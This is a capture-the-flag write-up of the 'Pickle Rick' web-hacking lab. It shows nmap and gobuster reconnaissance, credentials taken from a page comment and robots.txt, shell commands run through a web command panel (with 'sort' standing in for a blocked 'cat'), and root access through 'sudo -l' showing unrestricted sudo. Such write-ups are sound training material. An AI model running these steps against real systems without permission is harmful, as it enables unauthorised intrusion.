# Pickle Rick

**Category :** Web hacking 

**Difficulty :** Easy

**Description :** This Rick and Morty-themed challenge requires you to exploit a web 
server and find three ingredients to help Rick make his potion and 
transform himself back into a human from a pickle.

---

The first step is to do a basic nmap scan.

```bash
simsdu@laptop:~$ nmap -A -sV 10.65.171.240
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 21:52 CET
Nmap scan report for 10.65.171.240
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 60:64:a3:72:fc:0a:1c:de:62:45:43:a6:28:22:7f:b5 (RSA)
|   256 5e:fa:13:24:bf:44:08:aa:7c:e2:94:91:9f:17:d6:22 (ECDSA)
|_  256 f1:83:a1:e3:e6:83:a1:56:cd:b1:5e:13:7c:4a:a9:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   124.36 ms 192.168.128.1
2   ...
3   124.45 ms 10.65.171.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds
```

We can see 2 services running on port 22 and 80.

---

Then, let's run gobuster.

```bash
gobuster dir -u http://10.65.171.240/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,txt,html,js
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.171.240/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,js,php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets              (Status: 301) [Size: 315] [--> http://10.65.171.240/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

---

We can check the Page source of the Website.

```bash
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

We can see a comment giving us an username: R1ckRul3s.

We can now check some files or directory discover with gobuster.

robots.txt give us a string: **Wubbalubbadubdub**. We can try to use it as password in the login.php (we find this page with the gobuster scan report) and it worked. We now have access to a Command Panel where we can try `ls -la` 

```bash
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

We have two .txt files, lets try to print them.

The `cat` command is disable, so i try with `sort` and it worked.

And we print the first ingredient!

```bash
sort Sup3rS3cretPickl3Ingred.txt
first_ingredient_here
```

Now with the second .txt file.

```bash
sort clue.txt
Look around the file system for the other ingredient.
```

Let's use `pwd` to show where we are.

```bash
pwd
/var/www/html
```

We can try to look in the /home directory

```bash
ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Dec  2 20:43 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  5 ubuntu ubuntu 4096 Jul 11  2024 ubuntu
```

The rick one look's interesting !

```bash
ls -la /home/rick
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

Let's print this file.

```bash
sort /home/rick/"second ingredients"
second_ingredient_here
```

---

We have a last ingredient to find. Let's see what command we are able to run with sudo.

```bash
sudo -l
Matching Defaults entries for www-data on ip-10-65-171-240:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-65-171-240:
    (ALL) NOPASSWD: ALL
```

Okay, we can run a lot of command ! Let's look inside the /root directory.

```bash
sudo ls -la /root
total 36
drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Dec  2 21:51 ..
-rw-------  1 root root  168 Jul 11  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11  2024 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
```

We are near the end, let's print the 3rd.txt file.

```bash
sudo sort /root/3rd.txt
3rd ingredients: third_ingredient_here
```

We have found the 3 ingredients the CTF ask us !!!


